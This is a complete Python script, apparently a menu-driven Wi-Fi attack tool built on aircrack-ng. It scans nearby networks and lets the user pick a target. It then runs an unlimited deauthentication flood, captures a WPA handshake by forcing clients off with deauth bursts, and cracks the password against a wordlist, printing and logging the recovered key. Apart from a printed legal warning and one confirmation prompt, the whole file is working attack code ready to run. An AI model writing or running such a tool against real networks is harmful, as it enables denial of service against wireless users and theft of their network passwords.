#!/usr/bin/env python3
import subprocess
import sys
import os
import re
import time
from datetime import datetime

# --- CONFIGURATION ---
HOMEDIR = os.path.expanduser("~/")
CAPTURE_DIR = os.path.join(HOMEDIR, "handshake_captures")
LOG_FILE = os.path.join(CAPTURE_DIR, "wifi_tool.log")

# --- TOOL PATHS (assumed to be in /usr/sbin) ---
AIRMON_NG_PATH = "/usr/sbin/airmon-ng"
AIREPLAY_NG_PATH = "/usr/sbin/aireplay-ng"
AIRODUMP_NG_PATH = "/usr/sbin/airodump-ng"
AIRCRACK_NG_PATH = "/usr/sbin/aircrack-ng"

# --- UTILITY FUNCTIONS ---

def setup_environment():
    """Ensures the capture directory exists."""
    os.makedirs(CAPTURE_DIR, exist_ok=True)

def log_action(message):
    """Logs a message to the log file."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{timestamp}] {message}\n")

def print_warning():
    """Prints a prominent legal and ethical warning."""
    print("\n" + "="*60)
    print("WARNING: ADVANCED WIRELESS ATTACK TOOL".center(60))
    print("="*60)
    print("This tool can capture handshakes and crack passwords.")
    print("These actions carry significant legal risks.")
    print("You MUST have EXPLICIT, WRITTEN PERMISSION from the network")
    print("owner before using these features on any network.")
    print("Unauthorized use is ILLEGAL. You are responsible for your actions.")
    print("="*60 + "\n")

def check_root():
    """Checks for root privileges and exits if not found."""
    if os.geteuid() != 0:
        print("Error: This tool requires root privileges. Please run with 'sudo'.", file=sys.stderr)
        sys.exit(1)

# --- CORE MODULES ---

def select_interface():
    """Lists and selects a wireless interface."""
    log_action("Selecting wireless interface.")
    try:
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, check=True)
        interfaces = re.findall(r'Interface\s+(\w+)', result.stdout)
        if not interfaces:
            print("No wireless interfaces found.", file=sys.stderr)
            return None
        print("Available wireless interfaces:")
        for i, iface in enumerate(interfaces):
            print(f"  [{i+1}] {iface}")
        while True:
            try:
                choice = input("Select an interface (e.g., 1): ")
                if not choice: return None
                return interfaces[int(choice) - 1]
            except (ValueError, IndexError):
                print("Invalid selection.")
    except FileNotFoundError:
        print("Error: 'iw' command not found.", file=sys.stderr)
        return None

def scan_networks(ifname):
    """Scans for networks on a given interface."""
    log_action(f"Scanning for networks on {ifname}.")
    print(f"\nScanning for WiFi networks on {ifname}...")
    try:
        # Simplified command for better compatibility
        command = ["nmcli", "--terse", "--fields", "SSID,BSSID,CHAN,SECURITY", "dev", "wifi", "list", "ifname", ifname, "--rescan", "yes"]
        process = subprocess.run(command, capture_output=True, text=True, check=True)
        networks = []
        for line in process.stdout.strip().split('\n'):
            parts = line.rsplit(':', 3)
            if len(parts) == 4:
                networks.append({"SSID": parts[0], "BSSID": parts[1], "CHAN": parts[2], "SECURITY": parts[3]})
        return networks
    except subprocess.CalledProcessError as e:
        print(f"Error scanning: {e.stderr}", file=sys.stderr)
        return []

def deauth_attack(target, interface):
    """Performs a deauthentication attack."""
    log_action(f"Starting deauth attack on {target['BSSID']}.")
    print_warning()
    bssid, channel = target['BSSID'], target['CHAN']
    if input("Are you sure you want to proceed? (y/n): ").lower() != 'y':
        log_action("Deauth attack aborted by user.")
        return

    monitor_interface = None
    try:
        print(f"\nStarting monitor mode on {interface}...")
        mon_proc = subprocess.run(['sudo', AIRMON_NG_PATH, 'start', interface, channel], capture_output=True, text=True)
        mon_match = re.search(r'monitor mode enabled on (\w+)', mon_proc.stdout)
        monitor_interface = mon_match.group(1) if mon_match else f"{interface}mon"
        print(f"Monitor mode enabled on {monitor_interface}.")
        
        print(f"Starting deauthentication attack on {bssid}. Press Ctrl+C to stop.")
        subprocess.run(['sudo', AIREPLAY_NG_PATH, '--deauth', '0', '-a', bssid, monitor_interface])
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
        log_action("Deauth attack stopped by user.")
    finally:
        if monitor_interface:
            print(f"\nStopping monitor mode on {monitor_interface}...")
            subprocess.run(['sudo', AIRMON_NG_PATH, 'stop', monitor_interface], capture_output=True)
            log_action(f"Stopped monitor mode on {monitor_interface}.")

def capture_handshake(target, interface):
    """Captures a WPA/WPA2 handshake."""
    log_action(f"Starting handshake capture for {target['BSSID']}.")
    print_warning()
    bssid, channel = target['BSSID'], target['CHAN']
    capture_path = os.path.join(CAPTURE_DIR, f"{bssid.replace(':', '-')}_{int(time.time())}")

    monitor_interface = None
    try:
        print(f"\nStarting monitor mode on {interface}...")
        mon_proc = subprocess.run(['sudo', AIRMON_NG_PATH, 'start', interface, channel], capture_output=True, text=True)
        mon_match = re.search(r'monitor mode enabled on (\w+)', mon_proc.stdout)
        monitor_interface = mon_match.group(1) if mon_match else f"{interface}mon"
        print(f"Monitor mode enabled on {monitor_interface}.")

        print(f"Starting capture on {bssid}. Listening for handshake...")
        print("A deauth burst will be sent to speed up the process.")
        print("Press Ctrl+C to abort.")

        airodump_cmd = ['sudo', AIRODUMP_NG_PATH, '--bssid', bssid, '-c', channel, '-w', capture_path, monitor_interface]
        deauth_cmd = ['sudo', AIREPLAY_NG_PATH, '--deauth', '5', '-a', bssid, monitor_interface]

        with subprocess.Popen(airodump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) as p:
            time.sleep(5) # Let airodump start up
            subprocess.run(deauth_cmd, capture_output=True) # Send deauth burst
            for line in iter(p.stdout.readline, ''):
                if "WPA handshake:" in line:
                    print(f"\nSUCCESS: Handshake captured! Saved to {capture_path}-01.cap")
                    log_action(f"Handshake captured for {bssid}. Saved to {capture_path}-01.cap")
                    p.terminate()
                    break
    except KeyboardInterrupt:
        print("\nCapture aborted by user.")
        log_action("Handshake capture aborted by user.")
    finally:
        if monitor_interface:
            print(f"\nStopping monitor mode on {monitor_interface}...")
            subprocess.run(['sudo', AIRMON_NG_PATH, 'stop', monitor_interface], capture_output=True)
            log_action(f"Stopped monitor mode on {monitor_interface}.")

def crack_handshake():
    """Cracks a captured handshake using a wordlist."""
    log_action("Starting password cracking.")
    print_warning()
    try:
        cap_files = [f for f in os.listdir(CAPTURE_DIR) if f.endswith('.cap')]
        if not cap_files:
            print("No .cap files found in handshake_captures directory.")
            return
        
        print("Available handshake files:")
        for i, f in enumerate(cap_files):
            print(f"  [{i+1}] {f}")
        cap_choice = int(input("Select a file to crack: ")) - 1
        target_cap = os.path.join(CAPTURE_DIR, cap_files[cap_choice])

        default_wordlist = os.path.join(HOMEDIR, "Downloads", "rockyou.txt")
        wordlist_path = input(f"Enter path to wordlist [default: {default_wordlist}]: ") or default_wordlist

        if not os.path.exists(wordlist_path):
            print(f"Wordlist not found: {wordlist_path}", file=sys.stderr)
            log_action(f"Cracking failed: Wordlist not found at {wordlist_path}")
            return

        print(f"\nStarting crack attempt on {target_cap} with {wordlist_path}...")
        log_action(f"Cracking {target_cap} with {wordlist_path}")
        command = ['sudo', AIRCRACK_NG_PATH, target_cap, '-w', wordlist_path]
        process = subprocess.run(command, capture_output=True, text=True)

        if "KEY FOUND!" in process.stdout:
            key = re.search(r'KEY FOUND! \[ (.*) \]', process.stdout)
            if key:
                found_key = key.group(1)
                print(f"\nSUCCESS! Password found: {found_key}")
                log_action(f"Password found for {target_cap}: {found_key}")
        else:
            print("\nPassword not found in wordlist.")
            log_action(f"Password not found for {target_cap}.")

    except (ValueError, IndexError):
        print("Invalid selection.")
    except FileNotFoundError:
        print("Error: aircrack-ng not found.", file=sys.stderr)

# --- MAIN MENU & LOGIC ---

def main():
    """Main function to drive the tool."""
    check_root()
    setup_environment()
    log_action("Tool started.")
    
    interface = select_interface()
    if not interface:
        log_action("No interface selected. Exiting.")
        return

    networks = scan_networks(interface)
    if not networks:
        log_action("No networks found. Exiting.")
        return

    print(f"\n{'ID':<4} {'SSID':<32} {'BSSID':<17} {'CHANNEL':<7} {'SECURITY'}")
    print(f"{'-'*4} {'-'*32} {'-'*17} {'-'*7} {'-'*20}")
    for i, net in enumerate(networks):
        print(f"[{i+1:<2}] {net['SSID']:<32} {net['BSSID']:<17} {net['CHAN']:<7} {net['SECURITY']}")

    try:
        target_choice = int(input("\nSelect a target network by ID: ")) - 1
        target = networks[target_choice]
    except (ValueError, IndexError):
        print("Invalid target selection. Exiting.")
        return

    while True:
        print("\n--- Actions ---")
        print("1. Capture Handshake")
        print("2. Deauthentication Attack")
        print("3. Crack a Captured Handshake")
        print("4. Exit")
        action = input("Select an action: ")

        if action == '1':
            capture_handshake(target, interface)
        elif action == '2':
            deauth_attack(target, interface)
        elif action == '3':
            crack_handshake()
        elif action == '4':
            break
        else:
            print("Invalid action.")

    log_action("Tool finished.")
    print("Exiting tool.")

if __name__ == "__main__":
    main()

